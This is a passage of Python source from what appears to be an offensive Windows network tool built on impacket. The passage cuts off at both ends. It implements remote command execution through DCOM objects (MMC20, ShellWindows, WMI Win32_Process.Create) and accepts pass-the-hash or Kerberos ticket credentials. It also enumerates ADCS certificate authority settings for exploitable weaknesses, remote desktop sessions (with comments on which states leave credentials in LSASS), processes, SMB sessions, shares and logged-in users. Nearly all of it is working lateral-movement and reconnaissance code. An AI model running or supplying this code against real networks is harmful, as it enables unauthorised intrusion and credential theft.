		#	 ORPC call -> Get Object References (String bindings of the Object Exporter, IID, IPID, etc.)
		#	 Build and return the ORPC interface based on Object References

		# Connect to the Object Exporter that expose the created COM object
		iMMC = oaut.IDispatch(iInterface)
		dcomrt.DCOMConnection.PORTMAPS[ip] = dce

		# Query the COM object
		dispParams = oaut.DISPPARAMS(None, False)
		dispParams['rgvarg'] = NULL
		dispParams['rgdispidNamedArgs'] = NULL
		dispParams['cArgs'] = 0
		dispParams['cNamedArgs'] = 0
		if comMethod == 'ShellWindows':
			res = iMMC.GetIDsOfNames(('Item',))
			res = iMMC.Invoke(res[0], 0x409, oaut.DISPATCH_METHOD, dispParams, 0, [], [])
			iItem = oaut.IDispatch(getInterface(iMMC, res['pVarResult']['_varUnion']['pdispVal']['abData']))
			res = iItem.GetIDsOfNames(('Document',))
			res = iItem.Invoke(res[0], 0x409, oaut.DISPATCH_PROPERTYGET, dispParams, 0, [], [])
			pQuit = None
		else:
			res = iMMC.GetIDsOfNames(('Document',))
			res = iMMC.Invoke(res[0], 0x409, oaut.DISPATCH_PROPERTYGET, dispParams, 0, [], [])
			pQuit = iMMC.GetIDsOfNames(('Quit',))[0]

		iDocument = oaut.IDispatch(getInterface(iMMC, res['pVarResult']['_varUnion']['pdispVal']['abData']))
		if comMethod == 'MMC20':
			res = iDocument.GetIDsOfNames(('ActiveView',))
			res = iDocument.Invoke(res[0], 0x409, oaut.DISPATCH_PROPERTYGET, dispParams, 0, [], [])
			iActiveView = oaut.IDispatch(getInterface(iMMC, res['pVarResult']['_varUnion']['pdispVal']['abData']))
			pExecuteShellCommand = iActiveView.GetIDsOfNames(('ExecuteShellCommand',))[0]
			dispParams = oaut.DISPPARAMS(None, False)
			dispParams['rgdispidNamedArgs'] = NULL
			dispParams['cArgs'] = 4
			dispParams['cNamedArgs'] = 0
			arg0 = oaut.VARIANT(None, False)
			arg0['clSize'] = 5
			arg0['vt'] = oaut.VARENUM.VT_BSTR
			arg0['_varUnion']['tag'] = oaut.VARENUM.VT_BSTR
			arg0['_varUnion']['bstrVal']['asData'] = "cmd.exe"
			arg1 = oaut.VARIANT(None, False)
			arg1['clSize'] = 5
			arg1['vt'] = oaut.VARENUM.VT_BSTR
			arg1['_varUnion']['tag'] = oaut.VARENUM.VT_BSTR
			arg1['_varUnion']['bstrVal']['asData'] = 'C:\\windows\\system32'
			arg2 = oaut.VARIANT(None, False)
			arg2['clSize'] = 5
			arg2['vt'] = oaut.VARENUM.VT_BSTR
			arg2['_varUnion']['tag'] = oaut.VARENUM.VT_BSTR
			arg2['_varUnion']['bstrVal']['asData'] = "/c " + cmd
			arg3 = oaut.VARIANT(None, False)
			arg3['clSize'] = 5
			arg3['vt'] = oaut.VARENUM.VT_BSTR
			arg3['_varUnion']['tag'] = oaut.VARENUM.VT_BSTR
			arg3['_varUnion']['bstrVal']['asData'] = '7'
			dispParams['rgvarg'].append(arg3)
			dispParams['rgvarg'].append(arg2)
			dispParams['rgvarg'].append(arg1)
			dispParams['rgvarg'].append(arg0)
		else:
			res = iDocument.GetIDsOfNames(('Application',))
			res = iDocument.Invoke(res[0], 0x409, oaut.DISPATCH_PROPERTYGET, dispParams, 0, [], [])
			iActiveView = oaut.IDispatch(getInterface(iMMC, res['pVarResult']['_varUnion']['pdispVal']['abData']))
			pExecuteShellCommand = iActiveView.GetIDsOfNames(('ShellExecute',))[0]
			dispParams = oaut.DISPPARAMS(None, False)
			dispParams['rgdispidNamedArgs'] = NULL
			dispParams['cArgs'] = 5
			dispParams['cNamedArgs'] = 0
			arg0 = oaut.VARIANT(None, False)
			arg0['clSize'] = 5
			arg0['vt'] = oaut.VARENUM.VT_BSTR
			arg0['_varUnion']['tag'] = oaut.VARENUM.VT_BSTR
			arg0['_varUnion']['bstrVal']['asData'] = "cmd.exe"
			arg1 = oaut.VARIANT(None, False)
			arg1['clSize'] = 5
			arg1['vt'] = oaut.VARENUM.VT_BSTR
			arg1['_varUnion']['tag'] = oaut.VARENUM.VT_BSTR
			arg1['_varUnion']['bstrVal']['asData'] = "/c " + cmd
			arg2 = oaut.VARIANT(None, False)
			arg2['clSize'] = 5
			arg2['vt'] = oaut.VARENUM.VT_BSTR
			arg2['_varUnion']['tag'] = oaut.VARENUM.VT_BSTR
			arg2['_varUnion']['bstrVal']['asData'] = 'C:\\windows\\system32'
			arg3 = oaut.VARIANT(None, False)
			arg3['clSize'] = 5
			arg3['vt'] = oaut.VARENUM.VT_BSTR
			arg3['_varUnion']['tag'] = oaut.VARENUM.VT_BSTR
			arg3['_varUnion']['bstrVal']['asData'] = ''
			arg4 = oaut.VARIANT(None, False)
			arg4['clSize'] = 5
			arg4['vt'] = oaut.VARENUM.VT_BSTR
			arg4['_varUnion']['tag'] = oaut.VARENUM.VT_BSTR
			arg4['_varUnion']['bstrVal']['asData'] = '0'
			dispParams['rgvarg'].append(arg4)
			dispParams['rgvarg'].append(arg3)
			dispParams['rgvarg'].append(arg2)
			dispParams['rgvarg'].append(arg1)
			dispParams['rgvarg'].append(arg0)

		iActiveView.Invoke(pExecuteShellCommand, 0x409, oaut.DISPATCH_METHOD, dispParams, 0, [], [])

		dispParams = oaut.DISPPARAMS(None, False)
		dispParams['rgvarg'] = NULL
		dispParams['rgdispidNamedArgs'] = NULL
		dispParams['cArgs'] = 0
		dispParams['cNamedArgs'] = 0
		iMMC.Invoke(pQuit, 0x409, oaut.DISPATCH_METHOD, dispParams, 0, [], [])

		print ("[+] Command executed")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

#    COM objects
#    CLSID = 8BC3F05E-D86B-11D0-A075-00C04FB68820 for WbemLevel1Login
#    IID = F309AD18-D86A-11d0-A075-00C04FB68820 for IWbemLevel1Login

from impacket.dcerpc.v5.dcom import wmi

def RCEDCOM2(ip, user, pwd, domain, nthash, aesKey, ccache, cmd, unauthTransport = False, unauthBinding = False):
	###
	# Require administrative rights
	###

	print_yellow("[*] Executing command through WbemLevel1Login COM object")
	print_yellow("---")
	print()

	try:
		# Connect to the interface
		rpctransport = transport.DCERPCTransportFactory(r'ncacn_ip_tcp:%s' % ip)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		scm = dcomrt.IRemoteSCMActivator(dce)

		# Create COM object
		CLSID = UUIDStringToBin('8BC3F05E-D86B-11D0-A075-00C04FB68820') # WbemLevel1Login
		IID = UUIDTupToBin(('F309AD18-D86A-11d0-A075-00C04FB68820', '0.0')) # IWbemLevel1Login
		iInterface = scm.RemoteCreateInstance(CLSID, IID)
		# scm.RemoteCreateInstance(CLSID, IID):
		#	 dce.bind(uuidtup_to_bin(('000001A0-0000-0000-C000-000000000046', '0.0'))) # IRemoteSCMActivator
		#	 ORPC call -> Get Object References (String bindings of the Object Exporter, IID, IPID, etc.)
		#	 Build and return the ORPC interface based on Object References

		# Connect to the Object Exporter that expose the created COM object
		iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
		dcomrt.DCOMConnection.PORTMAPS[ip] = dce

		# Query the COM object
		iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
		iWbemLevel1Login.RemRelease()
		win32Process, _ = iWbemServices.GetObject('Win32_Process')
		win32Process.Create("cmd.exe /c " + cmd, "C:\\", None)

		print ("[+] Command executed")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

from impacket.dcerpc.v5 import dcomrt, ndr, dtypes
from impacket.dcerpc.v5.dcom import oaut

#    [MS-CSRA] = Certificate Services Remote Administration Protocol
#    COM objects
#    CLSID = D99E6E73-FC88-11D0-B498-00A0C90312F3 for CertAdminD / CertAdminD2
#    CLSID = D99E6E74-FC88-11D0-B498-00A0C90312F3 for CertRequestD2
#    IID = D99E6E71-FC88-11D0-B498-00A0C90312F3 for ICertAdminD
#    IID = 7FE0D935-DDA6-443F-85D0-1CFB58FE41DD for ICertAdminD2
#    IID = 5422FD3A-D4B8-4CEF-A12E-E87D4CA22E90 for ICertRequestD2

# MC-CSRA implementation from Certipy (https://github.com/ly4k/Certipy)

class DCERPCSessionErrorCSRA(rpcrt.DCERPCException):
	def __init__(self, error_string = None, error_code = None, packet = None):
		rpcrt.DCERPCException.__init__(self, error_string, error_code, packet)

	def __str__(self):
		key = self.error_code
		if key in ErrorsUtil.HRESULT_ERROR_MESSAGES:
			error_msg_short = ErrorsUtil.HRESULT_ERROR_MESSAGES[key][0]
			error_msg_verbose = ErrorsUtil.HRESULT_ERROR_MESSAGES[key][1]
			return 'CSRA SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
		elif key & 0xffff in ErrorsUtil.SYSTEM_ERROR_MESSAGES:
			error_msg_short = ErrorsUtil.SYSTEM_ERROR_MESSAGES[key & 0xffff][0]
			error_msg_verbose = ErrorsUtil.SYSTEM_ERROR_MESSAGES[key & 0xffff][1]
			return 'CSRA SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
		else:
			return 'CSRA SessionError: unknown error code: 0x%x' % self.error_code

class CERTTRANSBLOB(ndr.NDRSTRUCT):
	structure = (
		("cb", dtypes.ULONG),
		("pb", dtypes.PBYTE)
	)

class ICertAdminD_ResubmitRequest(dcomrt.DCOMCALL):
	opnum = 5
	structure = (
		("pwszAuthority", dtypes.LPWSTR),
		("pdwRequestId", dtypes.DWORD),
		("pwszExtensionName", dtypes.LPWSTR)
	)

class ICertAdminD_ResubmitRequestResponse(dcomrt.DCOMANSWER):
	structure = (("pdwDisposition", dtypes.ULONG),)

class ICertAdminD_DenyRequest(dcomrt.DCOMCALL):
	opnum = 6
	structure = (
		("pwszAuthority", dtypes.LPWSTR),
		("pdwRequestId", dtypes.DWORD)
	)

class ICertAdminD_DenyRequestResponse(dcomrt.DCOMANSWER):
	structure = (("ErrorCode", dtypes.ULONG),)

class ICertRequestD2_GetCAProperty(dcomrt.DCOMCALL):
	opnum = 7
	structure = (
		("pwszAuthority", dtypes.LPWSTR),
		("PropId", dtypes.LONG),
		("PropIndex", dtypes.LONG),
		("PropType", dtypes.LONG)
	)

class ICertRequestD2_GetCAPropertyResponse(dcomrt.DCOMANSWER):
	structure = (("pctbPropertyValue", CERTTRANSBLOB),)

class ICertAdminD2_GetCAProperty(dcomrt.DCOMCALL):
	opnum = 32
	structure = (
		("pwszAuthority", dtypes.LPWSTR),
		("PropId", dtypes.LONG),
		("PropIndex", dtypes.LONG),
		("PropType", dtypes.LONG)
	)

class ICertAdminD2_GetCAPropertyResponse(dcomrt.DCOMANSWER):
	structure = (("pctbPropertyValue", CERTTRANSBLOB),)

class ICertAdminD2_SetCAProperty(dcomrt.DCOMCALL):
	opnum = 33
	structure = (
		("pwszAuthority", dtypes.LPWSTR),
		("PropId", dtypes.LONG),
		("PropIndex", dtypes.LONG),
		("PropType", dtypes.LONG),
		("pctbPropertyValue", CERTTRANSBLOB)
	)

class ICertAdminD2_SetCAPropertyResponse(dcomrt.DCOMANSWER):
	structure = (("ErrorCode", dtypes.ULONG),)

class ICertAdminD2_GetCASecurity(dcomrt.DCOMCALL):
	opnum = 36
	structure = (("pwszAuthority", dtypes.LPWSTR),)

class ICertAdminD2_GetCASecurityResponse(dcomrt.DCOMANSWER):
	structure = (("pctbSD", CERTTRANSBLOB),)

class ICertAdminD2_SetCASecurity(dcomrt.DCOMCALL):
	opnum = 37
	structure = (("pwszAuthority", dtypes.LPWSTR), ("pctbSD", CERTTRANSBLOB))

class ICertAdminD2_SetCASecurityResponse(dcomrt.DCOMANSWER):
	structure = (("ErrorCode", dtypes.LONG),)

class ICertAdminD2_GetConfigEntry(dcomrt.DCOMCALL):
	opnum = 44
	structure = (
		("pwszAuthority", dtypes.LPWSTR),
		("pwszNodePath", dtypes.LPWSTR),
		("pwszEntry", dtypes.WSTR),
	)

class ICertAdminD2_GetConfigEntryResponse(dcomrt.DCOMANSWER):
	structure = (("pVariant", oaut.VARIANT),)

class ICertCustom(dcomrt.IRemUnknown):
	def request(self, req, *args, **kwargs):
		req["ORPCthis"] = self.get_cinstance().get_ORPCthis()
		req["ORPCthis"]["flags"] = 0
		self.connect(self._iid)
		dce = self.get_dce_rpc()
		try:
			resp = dce.request(req, self.get_iPid(), *args, **kwargs)
		except Exception as e:
			if str(e).find("RPC_E_DISCONNECTED") >= 0:
				msg = str(e) + "\n"
				msg += ("DCOM keep-alive pinging it might not be working as expected. You can't be idle for more than 14 minutes!\n")
				msg += "You should exit the app and start again\n"
				raise rpcrt.rpcrt.DCERPCException(msg)
			else:
				raise
		return resp

class ICertAdminD(ICertCustom):
	def __init__(self, interface):
		super().__init__(interface)
		self._iid = UUIDTupToBin(("D99E6E71-FC88-11D0-B498-00A0C90312F3", "0.0"))

class ICertAdminD2(ICertCustom):
	def __init__(self, interface):
		super().__init__(interface)
		self._iid = UUIDTupToBin(("7FE0D935-DDA6-443F-85D0-1CFB58FE41DD", "0.0"))

class ICertRequestD2(ICertCustom):
	def __init__(self, interface):
		super().__init__(interface)
		self._iid = UUIDTupToBin(("5422FD3A-D4B8-4CEF-A12E-E87D4CA22E90", "0.0"))

def getCAConfigCSRA(ip, user, pwd, domain, nthash, aesKey, ccache, caName, caFQDN, unauthTransport = False, unauthBinding = False):
	###
	# Require administrative rights
	###

	print_yellow("[*] Getting ADCS Certificate Authority configuration [MS-DCOM x MS-CSRA]")
	print_yellow("---")
	print()

	try:
		global DCERPCSessionError
		DCERPCSessionError = DCERPCSessionErrorCSRA

		# Connect to the interface
		rpctransport = transport.DCERPCTransportFactory(r'ncacn_ip_tcp:%s' % ip)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		scm = dcomrt.IRemoteSCMActivator(dce)

		# Create COM object
		CLSID = UUIDStringToBin('D99E6E73-FC88-11D0-B498-00A0C90312F3') # CertAdminD
		IID = UUIDStringToBin('7FE0D935-DDA6-443F-85D0-1CFB58FE41DD') # ICertAdminD2
		iInterface = scm.RemoteCreateInstance(CLSID, IID)
		# scm.RemoteCreateInstance(CLSID, IID):
		#	 dce.bind(uuidtup_to_bin(('000001A0-0000-0000-C000-000000000046', '0.0'))) # IRemoteSCMActivator
		#	 ORPC call -> Get Object References (String bindings of the Object Exporter, IID, IPID, etc.)
		#	 Build and return the ORPC interface based on Object References

		# Connect to the Object Exporter that expose the created COM object
		iInterface.get_cinstance().set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
		iCertAdminD2 = ICertAdminD2(iInterface)
		dcomrt.DCOMConnection.PORTMAPS[ip] = dce

		# Query the COM object
		request = ICertAdminD2_GetConfigEntry()
		request["pwszAuthority"] = caName if caName[-1] == "\x00" else caName + "\x00"
		request["pwszNodePath"] = "PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\x00"
		request["pwszEntry"] = "RequestDisposition\x00"
		resp = iCertAdminD2.request(request)
		requestDisposition = resp["pVariant"]["_varUnion"]["lVal"]
		if requestDisposition:
			requestDisposition = "Pending" if requestDisposition & 0x100 else "Issue"
		else:
			requestDisposition = "Unknown"

		request["pwszEntry"] = "EditFlags\x00"
		resp = iCertAdminD2.request(request)
		editFlags = resp["pVariant"]["_varUnion"]["lVal"]
		if editFlags:
			userSpecifiedSAN = "Enabled" if (editFlags & 0x00040000) == 0x00040000 else "Disabled"
		else:
			userSpecifiedSAN = "Unknown"

		request["pwszNodePath"] = "\x00"
		request["pwszEntry"] = "InterfaceFlags\x00"
		resp = iCertAdminD2.request(request)
		interfaceFlags = resp["pVariant"]["_varUnion"]["lVal"]
		if interfaceFlags:
			enforceEncICertReq = "Enabled" if (interfaceFlags & 0x00000200) == 0x00000200 else "Disabled"
		else:
			enforceEncICertReq = "Unknown"

		request = ICertAdminD2_GetCASecurity()
		request["pwszAuthority"] = caName if caName[-1] == "\x00" else caName + "\x00"
		resp = iCertAdminD2.request(request)
		sd = LDAPUtil.SECURITY_DESCRIPTOR.from_bytes(b"".join(resp["pctbSD"]["pb"]))

		try:
			res = requests.head(f"http://{caFQDN}/certsrv/", timeout = 3)
			webEnrollment = True if res.status_code != 404 else False
		except Exception as e:
			try:
				res = requests.head(f"https://{caFQDN}/certsrv/", timeout = 3, verify = False)
				webEnrollment = True if res.status_code != 404 else False
			except Exception as e:
				webEnrollment = False
		
		print(f"[+] User specified SAN = {userSpecifiedSAN}\n[+] Request disposition = {requestDisposition}\n[+] Encrypted certificate request required = {enforceEncICertReq}\n[+] Web enrollment = {webEnrollment}\n[+] Security Descriptor = {sd.to_sddl(ace_rights_adcs = True)}\n[+] Security Descriptor = {sd.to_sddl(ace_rights_adcs = True)}")
		return (userSpecifiedSAN, requestDisposition, enforceEncICertReq, sd, webEnrollment)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)
		return

################################################################################
#   [MS-TSTS] = Terminal Services Terminal Server Runtime Interface Protocol   #
#         Interfaces = TermSrvEnumeration / TermSrvSession / LegacyAPI         #
################################################################################

from impacket.dcerpc.v5 import tsts

def listRDSSessions(ip, user, pwd, domain, nthash, aesKey, ccache, unauthTransport = False, unauthBinding = False, alternateBinding = None):
	###
	# Does not require administrative rights
	# BUT "However, only sessions for which the caller has WINSTATION_QUERY permission are enumerated. The method checks whether the caller has WINSTATION_QUERY permission (section 3.1.1) by setting it as the Access Request mask, and skips the sessions for which the caller does not have the permission."
	#	https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsts/1a7d5d1d-1ce5-448f-bb4a-c79741982edb
	#
	# Notable states with Session Tokens/Reusable creds in LSASS
	#	Active + Unlocked -> User is logged in
	#	Active + Locked -> User locked the session
	#	Disconnected + Unlocked -> User switched session
	###

	print_yellow("[*] Listing Remote Desktop Services sessions")
	print_yellow("---")
	print()

	try:
		# Connect to the interface TermSrvEnumeration
		if alternateBinding == None:
			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\LSM_API_service]' % ip)
		else:
			rpctransport = transport.DCERPCTransportFactory(alternateBinding)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		dce.bind(UUIDTupToBin(('88143fd0-c28d-4b2b-8fef-8d882f6a9390', '1.0')))

		# Query methods of the interface
		handle = tsts.hRpcOpenEnum(dce)
		rSessions = tsts.hRpcGetEnumResult(dce, handle, Level = 1)['ppSessionEnumResult']
		tsts.hRpcCloseEnum(dce, handle)

		# Connect to the interface TermSrvSession
		if alternateBinding == None:
			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\LSM_API_service]' % ip)
		else:
			rpctransport = transport.DCERPCTransportFactory(alternateBinding)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		dce.bind(UUIDTupToBin(('484809d6-4239-471b-b5bc-61df8c23ac48', '1.0')))

		# Query methods of the interface
		desktopStates = {
			'WTS_SESSIONSTATE_UNKNOWN': 'Unknown',
			'WTS_SESSIONSTATE_LOCK'	 : 'Locked',
			'WTS_SESSIONSTATE_UNLOCK' : 'Unlocked',
		}
		found = False
		for i in rSessions:
			found = True
			maybeSleep()
			sess = i['SessionInfo']['SessionEnum_Level1']
			sessID = sess['SessionId']
			sessName = sess['Name'] if sess['Name'] != '' else 'None'
			sessState = tsts.enum2value(tsts.WINSTATIONSTATECLASS, sess['State']).split('_')[-1]
			data = tsts.hRpcGetSessionInformationEx(dce, sessID)
			sessFlags = desktopStates[tsts.enum2value(tsts.SESSIONFLAGS, data['LSMSessionInfoExPtr']['LSM_SessionInfo_Level1']['SessionFlags'])]
			sessDomain = data['LSMSessionInfoExPtr']['LSM_SessionInfo_Level1']['DomainName']
			sessUsername = data['LSMSessionInfoExPtr']['LSM_SessionInfo_Level1']['UserName']
			if (sessDomain != '' and sessUsername != ''):
				sessLogin = f"{sessDomain}\\{sessUsername}"
			elif (sessDomain == '' and sessUsername == ''):
				sessLogin = 'None'
			elif (sessDomain == ''):
				sessLogin = f".\\{sessUsername}"
			else:
				sessLogin = f"{sessDomain}\\None" # Should not happen
			sessConnectTime = data['LSMSessionInfoExPtr']['LSM_SessionInfo_Level1']['ConnectTime']
			sessConnectTime = sessConnectTime.strftime(r'%Y/%m/%d %H:%M:%S') if sessConnectTime.year > 1601 else 'None'
			sessDisconnectTime = data['LSMSessionInfoExPtr']['LSM_SessionInfo_Level1']['DisconnectTime']
			sessDisconnectTime = sessDisconnectTime.strftime(r'%Y/%m/%d %H:%M:%S') if sessDisconnectTime.year > 1601 else 'None'
			sessLogonTime = data['LSMSessionInfoExPtr']['LSM_SessionInfo_Level1']['LogonTime']
			sessLastInputTime = data['LSMSessionInfoExPtr']['LSM_SessionInfo_Level1']['LastInputTime']
			print(f"[+] Session ID = {sessID}\n\t[+] Session Name = {sessName}\n\t[+] Session Username = {sessLogin}\n\t[+] Session State = {sessState}\n\t[+] Session Desktop = {sessFlags}\n\t[+] Session Connect Time = {sessConnectTime}\n\t[+] Session Disconnect Time = {sessDisconnectTime}")

		if not found:
			print(f"[-] No Remote Desktop Sessions or user does not have read rights", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def listProcesses(ip, user, pwd, domain, nthash, aesKey, ccache, unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None):
	###
	# Require administrative rights
	###

	print_yellow("[*] Listing running processes")
	print_yellow("---")
	print()

	try:
		# Connect to the interface LegacyAPI
		if alternateBinding == None:
			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\Ctx_WinStation_API_service]' % ip)
		else:
			rpctransport = transport.DCERPCTransportFactory(alternateBinding)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		if alternateInterface == None:
			dce.bind(UUIDTupToBin(('5ca4a760-ebb1-11cf-8611-00a0245420ed', '1.0')))
		else:
			dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))

		# Query methods of the interface
		handle = tsts.hRpcWinStationOpenServer(dce)
		r = tsts.hRpcWinStationGetAllProcesses(dce, handle)
		if not len(r):
			return None
		print(f"[+] {'Processus':<50} {'PID':<10} {'SessionID':<10} {'Owner':<10}")
		for procInfo in r:
			print(f"[+] {procInfo['ImageName']:<50} {procInfo['UniqueProcessId']:<10} {procInfo['SessionId']:<10} {procInfo['pSid']:<10}")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

##################################################
#   [MS-SRVS] = Server Service Remote Protocol   #
#               Interface = SRVSVC               #
##################################################

from impacket.dcerpc.v5 import srvs

def listSessions(ip, user, pwd, domain, nthash, aesKey, ccache, unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None):
	###
	# Does not require administrative rights
	# BUT will display only our session
	###

	print_yellow("[*] Listing sessions on remote host")
	print_yellow("---")
	print()

	try:
		# Connect to the interface
		if alternateBinding == None:
			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\srvsvc]' % ip)
		else:
			rpctransport = transport.DCERPCTransportFactory(alternateBinding)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		if alternateInterface == None:
			dce.bind(UUIDTupToBin(('4B324FC8-1670-01D3-1278-5A47BF6EE188', '3.0')))
		else:
			dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))

		# Query methods of the interface
		res = srvs.hNetrSessionEnum(dce, '\x00', NULL, 10)
		print(f"[+] {'Username':<30} {'SourceIP':<30} {'Active':<30} {'Idle':<30}")
		for session in res['InfoStruct']['SessionInfo']['Level10']['Buffer']:
			username = session['sesi10_username'][:-1]
			sourceIP = session['sesi10_cname'][:-1][2:]
			active = session['sesi10_time']
			idle = session['sesi10_idle_time']
			print(f"[+] {username:<30} {sourceIP:<30} {active:<30} {idle:<30}")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def listShares(ip, user, pwd, domain, nthash, aesKey, ccache, unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None):
	###
	# Does not require administrative rights
	###

	print_yellow("[*] Listing shares on remote host")
	print_yellow("---")
	print()

	try:
		# Connect to the interface
		if alternateBinding == None:
			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\srvsvc]' % ip)
		else:
			rpctransport = transport.DCERPCTransportFactory(alternateBinding)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		if alternateInterface == None:
			dce.bind(UUIDTupToBin(('4B324FC8-1670-01D3-1278-5A47BF6EE188', '3.0')))
		else:
			dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))

		# Query methods of the interface
		res = srvs.hNetrShareEnum(dce, 1)
		sharesInfo = res['InfoStruct']['ShareInfo']['Level1']['Buffer']
		for shareInfo in sharesInfo:
			print("[+] {} : {}".format(shareInfo['shi1_netname'], shareInfo['shi1_remark'] if shareInfo['shi1_remark'] != '\x00' else '<No Description>'))
		
		return sharesInfo
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

#######################################################
#   [MS-WKST] = Workstation Service Remote Protocol   #
#                Interface = WKSSVC                   #
#######################################################

from impacket.dcerpc.v5 import wkst

def listLoggedIn(ip, user, pwd, domain, nthash, aesKey, ccache, unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None):
	###
	# Require administrative rights
	###

	print_yellow("[*] Listing logged in users on remote host")
	print_yellow("---")
	print()

	try:
		# Connect to the interface
		if alternateBinding == None:
			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\wkssvc]' % ip)
		else:
			rpctransport = transport.DCERPCTransportFactory(alternateBinding)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		if not unauthTransport:
